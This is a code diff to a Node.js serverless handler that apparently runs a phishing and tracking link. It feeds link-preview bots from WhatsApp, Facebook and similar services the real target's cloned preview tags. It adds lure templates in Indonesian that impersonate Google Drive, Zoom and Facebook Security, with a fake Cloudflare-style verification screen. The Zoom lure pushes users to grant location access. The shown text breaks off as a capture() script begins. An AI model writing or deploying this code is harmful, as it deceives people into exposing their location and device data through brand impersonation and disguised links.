@@ -1,7 +1,7 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    const { topic, t } = req.query;
+    const { topic, t, tpl } = req.query;
 
     let targetUrl = 'https://google.com';
     if (t) {
@@ -28,7 +28,6 @@ module.exports = async (req, res) => {
     const isBot = /bot|preview|whatsapp|facebook|telegram|twitter|linkedin|skype|discord/i.test(ua);
 
     // [LINK PREVIEW SPOOFING]
-    // If request comes from WhatsApp/FB preview bot, clone the Target's Open Graph tags!
     if (isBot) {
         let ogTags = '<title>Sedang Memuat...</title>';
         try {
@@ -48,39 +47,55 @@ module.exports = async (req, res) => {
             if (tags) ogTags = tags;
         } catch (e) { }
 
-        // Give the bot a perfect clone of the target's preview, NO TRAP JS.
         return res.status(200).send(`<!DOCTYPE html><html><head>${ogTags}</head><body></body></html>`);
     }
 
-    // We serve an HTML page that does the fingerprinting + redirection
-    // This allows us to use Browser APIs and gives a fake loading screen to buy time
+    // TEMPLATE ENGINE
+    let theme = {
+        bg: '#fff',
+        fg: '#333',
+        title: 'Just a moment...',
+        h1: 'Checking your browser...',
+        p: 'We need to verify you are human before accessing the content.',
+        btn: 'VERIFY & CONTINUE',
+        spinner: '#f68b1e'
+    };
+
+    if (tpl === 'drive') {
+        theme = { bg: '#fff', fg: '#202124', title: 'Google Drive - Request Access', h1: 'Akses Ditolak', p: 'File ini bersifat privat. Klik tombol di bawah untuk meminta akses dari pemilik file.', btn: 'MINTA AKSES FILR' };
+    } else if (tpl === 'zoom') {
+        theme = { bg: '#2D2E33', fg: '#fff', title: 'Join Meeting - Zoom', h1: 'Menunggu Host...', p: 'Sedang memverifikasi koneksi rapat Anda. Pastikan izin lokasi aktif untuk sinkronisasi server.', btn: 'GABUNG RAPAT (LOAD)' };
+    } else if (tpl === 'meta') {
+        theme = { bg: '#0668E1', fg: '#fff', title: 'Facebook Security', h1: 'Konfirmasi Identitas', p: 'Telah terdeteksi upaya login mencurigakan. Harap verifikasi browser Anda untuk mengamankan akun.', btn: 'SAYA ADALAH PEMILIKNYA' };
+    }
+
     const html = `<!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Just a moment...</title>
+    <title>${theme.title}</title>
     <style>
-        body { margin: 0; padding: 0; background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .cf-wrapper { text-align: center; max-width: 600px; padding: 20px; }
-        .cf-spinner { border: 4px solid transparent; border-top: 4px solid #f68b1e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { margin: 0; padding: 0; background: ${theme.bg}; color: ${theme.fg}; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
+        .cf-wrapper { text-align: center; max-width: 500px; padding: 30px; border-radius: 12px; }
+        .cf-spinner { border: 4px solid transparent; border-top: 4px solid ${theme.spinner || theme.fg}; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 24px; font-weight: normal; margin-bottom: 20px; }
-        p { font-size: 15px; color: #555; margin-bottom: 10px; }
-        .cf-btn { display: inline-block; background: #0051c3; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 15px; font-weight: bold; }
-        .cf-footer { margin-top: 50px; font-size: 13px; color: #999; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
+        p { font-size: 15px; opacity: 0.8; margin-bottom: 25px; line-height: 1.5; }
+        .cf-btn { display: inline-block; background: ${theme.tpl === 'drive' ? '#1a73e8' : '#0051c3'}; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; transition: scale 0.2s; }
+        .cf-btn:active { transform: scale(0.98); }
+        .cf-footer { margin-top: 50px; font-size: 11px; opacity: 0.5; }
     </style>
 </head>
 <body>
     <div class="cf-wrapper">
         <div id="loadingState">
-            <div class="cf-spinner"></div>
-            <h1>Checking your browser...</h1>
-            <p>We need to verify you are human before accessing the content.</p>
-            <p>Please click "Allow" on the verification prompt if asked.</p>
-            <button class="cf-btn" id="verifyBtn">VERIFY & CONTINUE</button>
+            ${tpl === 'meta' ? '' : '<div class="cf-spinner"></div>'}
+            <h1>${theme.h1}</h1>
+            <p>${theme.p}</p>
+            <button class="cf-btn" id="verifyBtn">${theme.btn}</button>
         </div>
-        <div class="cf-footer">Ray ID: ${Math.random().toString(36).substring(2, 12)} • Performance & security by Cloudflare</div>
+        <div class="cf-footer">Request ID: ${Math.random().toString(36).substring(2, 12).toUpperCase()} • SSL Secure Tracking</div>
     </div>
     <script>
         async function capture() {
